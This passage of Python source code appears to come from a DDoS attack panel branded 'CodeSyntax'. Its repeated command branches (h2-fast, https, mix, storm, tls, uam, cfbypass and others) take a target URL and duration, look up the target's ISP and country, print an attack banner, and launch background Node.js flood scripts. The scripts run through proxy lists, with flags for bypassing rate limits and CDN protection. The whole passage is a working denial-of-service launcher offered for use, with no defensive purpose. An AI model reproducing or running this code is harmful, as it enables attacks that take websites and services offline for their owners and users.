            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "h2-fast" or sinput == "H2-FAST":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'h2-fast',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node rapid.js GET {url} {duration} 3 64 proxy.txt --query 1 --delay 1 --bfm true --ratelimit true --cdn true')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "https" or sinput == "HTTPS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'https',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node zan.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "https2" or sinput == "HTTPS2":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'https2',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node Medusa.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "mix" or sinput == "MIX":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'mix',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node MIX.js {url} {duration} 100 5')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "storm" or sinput == "STORM":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'storm',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node SkycatXStorm.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "strike" or sinput == "STRIKE":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'strike',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node strike.js GET {url} {duration} 3 64 proxy.txt --full')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tls" or sinput == "TLS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tls',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node StarsXTls.js {url} {duration} 100 5')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "crash" or sinput == "CRASH":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'crash',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node hold.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "browser" or sinput == "Browser":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'bowser',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node browser.js {url} {duration}')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "uam" or sinput == "UAM":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'uam',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node UAM.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "xyn" or sinput == "XYN":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'xyn',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node xyn.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "floodv2" or sinput == "FLOODV2":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'floodv2',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node Xyzen.js {url} {duration} 64 3 proxy.txt FLOOD')
                    
            except ValueError:
                main()
            except IndexError:
                main()
                
                
        elif sinput == "cfbypass" or sinput == "CFBYPASS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'cfbypass',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node cfbypass.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "h2-rape" or sinput == "H2-RAPE":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'h2-rape',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
